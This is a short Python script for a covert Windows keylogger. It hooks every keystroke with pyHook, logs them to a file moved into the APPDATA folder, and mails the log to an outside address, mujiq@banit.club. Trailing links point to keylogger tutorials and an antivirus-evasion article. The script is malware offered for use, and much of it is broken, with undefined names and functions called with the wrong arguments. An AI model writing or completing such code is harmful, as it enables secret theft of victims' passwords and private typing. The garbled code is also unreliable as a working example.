import pyHook, pythoncom, sys, logging, os, smtplib, time

# locator
temp = [A,B,C,D,E,F,G,H,I,J]
path = APPDATA
D = 0x90
for root, dirs, files in os.walk(path):
        if temp in files:
            D = os.path.join(root, temp)

# mover

comp = 'C:fin.txt'
os.rename(comp, D + comp[2:])

# creator
def make(event):
	logging.basicConfig(filename=comp, level=logging.DEBUG, format='%(message)s')
	chr(event.Ascii)
	logging.log(10,chr(event.Ascii))
	return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()



# sender
def exped():
    return raw_input(fin.txt).strip()

fromaddr = ("From: ")
toaddrs  = ("To:mujiq@banit.club").split()

# Add the From: and To: headers at the start!
msg = ("From: %s\r\nTo: %s\r\n\r\n"
       % (fromaddr, ", ".join(toaddrs)))
while 1:
    try:
        line = raw_input()
    except EOFError:
        break
    if not line:
        break
    msg = msg + line

server = smtplib.SMTP('localhost')
server.set_debuglevel(1)
server.sendmail(fromaddr, toaddrs, msg)
server.quit()


make()
time.sleep(2)
exped()

# https://lifestohack.com/how-to-make-very-simple-keylogger/
# https://stackoverflow.com/questions/5247653/how-to-send-output-from-a-python-script-to-an-email-address
# https://www.securitysift.com/pecloak-py-an-experiment-in-av-evasion/
# https://app.getnada.com/inbox/
# https://stackoverflow.com/questions/5404068/how-to-read-keyboard-input
# http://code.activestate.com/recipes/497000-build-a-compressed-self-extracting-executable-scri/